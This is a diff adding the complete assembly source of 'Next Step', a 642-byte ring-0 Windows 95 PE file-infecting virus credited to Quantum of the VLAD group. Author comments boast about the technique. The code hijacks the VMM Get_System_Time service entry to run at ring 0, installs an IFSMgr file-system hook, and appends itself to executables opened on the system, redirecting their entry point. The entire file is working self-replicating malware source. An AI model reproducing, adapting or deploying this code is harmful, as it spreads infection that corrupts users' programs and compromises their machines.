@@ -1,0 +1,409 @@
+   ;
+   ; Next Step by Quantum / VLAD
+   ;
+   ;Anyone who had read my Fuck Harry source will find this virus very
+   ;similar. Just recently I became interested in writing a ring-0 win95 PE
+   ;infector again.  On looking at my Fuck Harry virus I noticed a number of
+   ;improvements that could be made.  This virus is the product.  Fuck Harry
+   ;used zero space in the VMM device driver to store itself.  This virus
+   ;could do that just as well but instead I have come up with a better
+   ;method.  Using the heap alloc function of IFSMgr this virus is more
+   ;stable.  It also includes a bit of code which I assume would allow this
+   ;virus to return to host under winNT without giving errors.
+   ;
+   ;When I look at this virus and Fuck Harry I still can't beleive the
+   ;mental alienation of Microsoft.  The idea that a ring-3 application
+   ;running in a seperate virtual machine can write to ring-0 vxd space is
+   ;beyond incompetense.  Not only is it possible to write to vxd space but
+   ;you can set an entry in the VMM service table that gets called every
+   ;second (Get_System_Time) to a handler that is in a ring-3 selector.
+   ;That's what this virus does.  Once the handler gets control it allocates
+   ;some space on the IFSMgr heap and copies the virus there.  It then calls
+   ;the IFSMgr_InstallFileSystemApiHook routine to trap file opens.  So,
+   ;needless to say, such terms as "Hacking ring-0" don't apply to windows
+   ;95.  I sincerely hope that such things are not mirrored in windows NT.
+   ;I don't have winNT (or desire to install it) so I can't check. If such
+   ;things were possible one would suspect security concerns to be raised.
+   ;The one thing I hate is the way dynamic linking is done.  It's a good
+   ;idea I guess but it means you have to put the dynamic linking code back
+   ;before you write the file - annoying.
+   ;
+   ;I actually have tried to optimize this virus.  You could take out all
+   ;the little checks, write to zero space in vmm again, etc and make this
+   ;virus smaller but I honestly think sacrificing stability for size is a
+   ;pointless exercise.
+   ;
+   ; 642 bytes
+   ;
+   .386
+   .model flat,STDCALL
+
+   ;
+   ; Define the external functions we will be linking to
+   ;
+   extrn        ExitProcess:PROC
+
+   .data
+   copyright    db 'Custom Host',0
+
+   ; dynamic linking
+   IFSMgr_GetHeap equ db 0cdh,20h,0dh,0,40h,0
+   IFSMgr_InstallFileSystemApiHook equ db 0cdh,20h,67h,0,40h,0
+   IFSMgr_Ring0_FileIO equ db 0cdh,20h,32h,0,40h,0
+   UniToBCSPath equ db 0cdh,20h,41h,0,40h,0
+
+   ; these are some includes I lifted from ifs.inc
+   IFSFN_OPEN  equ 36    ; open file
+   R0_READFILE equ 0d600h
+   R0_WRITEFILE equ 0d601h
+   R0_OPENCREATFILE equ 0d500h
+   R0_CLOSEFILE equ 0d700h
+   R0_GETFILESIZE equ 0D800h
+
+   startvirus:      ; virus starts here
+   rstart:
+
+       mov ax,cs          ; make sure cs is win95
+       cmp ax,137h
+       jnz weout
+
+       call    recalc1            ; get delta offset
+   recalc1:
+       pop ebp
+       sub ebp,recalc1-startvirus
+
+       mov [ebp+delta1-startvirus],ebp    ; self modify second delta
+
+       mov esi,0c000e98ch       ; make sure vmm in right place
+       lea edi,[ebp+vmmstr-startvirus]
+       cmpsd
+       jnz weout
+       cmpsd
+       jnz weout
+       mov esi,[esi+30h-0ch-8]       ; get the vmm service table
+       add esi,3fh*4
+       mov eax,[esi]             ; get address of get_system_time
+
+       ; save the offset of vmm service table entry for get_system_time
+       mov [ebp+p_get_sys_time-startvirus],esi
+       ; save the address of get_system_time
+       mov [ebp+org_get_sys_time-startvirus],eax
+
+       ; set get_system_time in vmm service table to our routine
+       mov dword ptr [esi],setuproutine-startvirus
+       add dword ptr [esi],ebp
+
+       ; wait until routine has set itself up
+   wait1:
+       cmp byte ptr [ebp+wtc-startvirus],1
+       jnz wait1
+
+   weout:
+
+       ; return to host
+       db  068h               ; push orghost
+   orghost dd  offset dummyhost
+       ret
+
+   vmmstr db "VMM     "             ; this must be in the vmm ddb
+
+   ; above is ring-3.  Below is ring-0.
+
+       ; this routine is called in place of get_system_time
+   setuproutine:
+       pusha
+       db  0bdh                      ; get the delta again
+   delta1  dd  offset startvirus
+
+       ; allocate some memory on the net stack
+       mov eax,endvirus-startvirus+1024
+       push    eax
+   fix1:
+       IFSMgr_GetHeap
+       pop ecx
+       or  eax,eax      ; were we successful ??
+       jz  nomem
+
+       xchg    eax,edi      ; yes. address -> edi
+       mov esi,ebp      ; esi = startvirus
+       push    edi      ; save address
+       sub cx,1024
+       rep movsb        ; copy the virus to net heap
+       pop edi
+
+       ; save the ring0 delta offset
+       mov [edi+r0delta1-startvirus],edi
+       lea eax,[edi+apihook-startvirus]  ; FSAPI hook
+       push    eax
+       IFSMgr_InstallFileSystemApiHook           ; set the hook
+       pop ebx
+       mov [edi+nexthook-startvirus],eax ; save the old hook
+
+       mov eax,0c000e980h+0ch+4      ; mark residency
+       mov [eax],eax
+
+   nomem:
+       ; set the vmm service table to the original value
+       db  0bfh         ; mov edi,p_get_sys_time
+   p_get_sys_time  dd 0
+       mov eax,[ebp+org_get_sys_time-startvirus]
+       stosd
+
+       ; stop the host code waiting
+       mov byte ptr [ebp+wtc-startvirus],1
+       popa
+
+       ; go back to original get_system_time
+       db  068h         ; push org_get_sys_time
+   org_get_sys_time  dd 0
+       ret
+
+   inuseflag db 0
+   wtc db 0
+
+   ; this routine is called by IFSMgr whenever a file operation is performed
+   apihook:
+       push    ebp
+       mov ebp,esp
+
+       sub esp,20h
+
+       push    ebx
+       push    esi
+       push    edi
+
+       db  0bfh               ; mov edi,r0delta1
+   r0delta1 dd 0
+
+       cmp byte ptr [edi+inuseflag-startvirus],1  ; so we dont re-enter
+       je  okfile
+
+       cmp dword ptr [ebp+12],IFSFN_OPEN     ; is this an openfile call ?
+       jne okfile
+
+       mov byte ptr [edi+inuseflag-startvirus],1
+
+       pusha
+
+       ; convert the name to ascii
+
+       lea esi,[edi+namestore-startvirus]
+       push    esi
+       mov eax,[ebp+16]
+
+       cmp al,0ffh
+       je  uncname
+
+       add al,'@'
+       mov [esi],al
+       inc esi
+       mov byte ptr [esi],':'
+       inc esi
+   uncname:
+
+       xor eax,eax
+       push    eax
+
+       dec al
+       push    eax
+
+       mov ebx,[ebp+28]
+       mov eax,[ebx+12]
+       add eax,4
+       push    eax
+
+       mov eax,esi
+       push    eax
+
+   fix2:
+       UniToBCSPath
+
+       add esp,4*4
+
+       add esi,eax
+       mov byte ptr [esi],0    ;add the terminator-z
+
+       ; is it exe ?
+       cmp dword ptr [esi-8],'OYOY'        ; 7
+       pop eax             ; 1
+       jne notexe              ; 2
+       push    eax             ; 1
+       cmp dword ptr [esi-4],'EXE.'
+       pop esi
+       jne notexe
+
+       ; set the dynamic routines that get altered to calls back to ints
+       mov cx,20cdh                    ;4
+       mov eax,40000dh                 ;5
+       mov word ptr [edi+fix1-startvirus],cx       ;4
+       mov dword ptr [edi+fix1-startvirus+2],eax       ;6
+       mov word ptr [edi+fix2-startvirus],cx       ;4
+       mov al,41h                      ;2
+       mov dword ptr [edi+fix2-startvirus+2],eax       ;6
+       mov word ptr [edi+fix3-startvirus],cx       ;4
+       mov al,32h                      ;2
+       mov dword ptr [edi+fix3-startvirus+2],eax       ;6
+                                   ;39
+
+       ; open the file
+       xor ecx,ecx
+   ;    lea     esi,[edi+namestore-startvirus]
+       mov bx,2
+       mov dx,1
+       mov eax,R0_OPENCREATFILE
+       call    r0fio
+       jc  notexe
+
+       xchg    ebx,eax
+
+       ; read the first 1024 bytes of the file
+   ;    lea     esi,[edi+namestore-startvirus]
+       xor edx,edx
+       mov cx,1024
+       mov eax,R0_READFILE
+       call    r0fio
+
+       ; is it mz ?
+       cmp word ptr [esi],5a4dh
+       jnz fileclose
+
+       ; get peheader offset
+       mov edx,[esi+3ch]
+
+       cmp edx,512          ; pe header too far along
+       ja  fileclose
+
+       ; is it pe,0,0 ?
+       cmp dword ptr [esi+edx],00004550h
+       jnz fileclose
+
+       test    word ptr [esi+edx+22],2000h   ; is it a library ?
+       jnz fileclose
+
+       ; save the orghost
+       mov eax,[esi+edx+40]
+       add eax,[esi+edx+52]
+       mov [edi+orghost-startvirus],eax
+
+       push    edx
+
+       ; locate last object in the object table
+       movzx   ecx,word ptr [esi+edx+6]      ; get number of objects
+       mov eax,ecx
+       shl eax,5                 ; mul 32
+       shl ecx,3                 ; mul 8
+       add eax,ecx               ; add em = mul by 28h
+       movzx   ecx,word ptr [esi+edx+20]     ; nt hdr size
+       add eax,ecx               ; add it
+       sub eax,28h-24            ; add 24, sub 28h
+       add edx,eax               ; esi+edx = last object
+
+       ; get the entrypoint rva
+       mov ecx,[esi+edx+12]          ; rva
+       add ecx,[esi+edx+16]          ; physical size
+
+       ; if last object size is odd then file already infected
+       mov eax,[esi+edx+16]          ; physical size
+       test    al,1
+       jnz fileclose1
+       add eax,[esi+edx+20]          ; physical offset
+
+       or  byte ptr [esi+edx+39],0e0h   ; make object writable
+
+       push    eax
+       mov ebp,(endvirus-startvirus) OR 1
+       add [esi+edx+16],eax          ; physical size
+       mov eax,[esi+edx+16]
+       cmp [esi+edx+8],eax
+       ja  noprob
+       mov [esi+edx+8],eax           ; virtual size
+   noprob:
+       pop eax
+
+       pop edx
+       push    eax
+
+       ; set the entrypoint rva
+       mov [esi+edx+40],ecx
+
+       ; increase the image size
+       add dword ptr [esi+edx+80],ebp
+
+       ; write the pe header
+       xor edx,edx
+       mov ecx,1024
+       mov eax,R0_WRITEFILE
+       call    r0fio
+
+       ; write the virus
+       pop edx
+       mov esi,edi
+       xchg    ecx,ebp
+       mov eax,R0_WRITEFILE
+       call    r0fio
+
+       push    edx
+
+   fileclose1:
+
+       pop edx
+
+   fileclose:
+
+       ; close the file
+       mov eax,R0_CLOSEFILE
+       call    r0fio
+
+   notexe:
+       popa
+
+       mov byte ptr [edi+inuseflag-startvirus],0
+
+   okfile:
+
+       mov eax,[ebp+28]         ; call the old hooker
+       push    eax
+       mov eax,[ebp+24]
+       push    eax
+       mov eax,[ebp+20]
+       push    eax
+       mov eax,[ebp+16]
+       push    eax
+       mov eax,[ebp+12]
+       push    eax
+       mov eax,[ebp+8]
+       push    eax
+
+       db  0b8h
+   nexthook dd 0
+       call    [eax]
+
+       add esp,6*4
+
+       pop edi
+       pop esi
+       pop ebx
+
+       leave
+       ret
+
+   r0fio:
+   fix3:
+       IFSMgr_Ring0_FileIO
+       ret
+
+   namestore:
+
+   endvirus:
+
+   .code
+
+   start:
+       jmp rstart
+
+   dummyhost:
+       push    0
+       call    ExitProcess
+
+   ends
+   end start
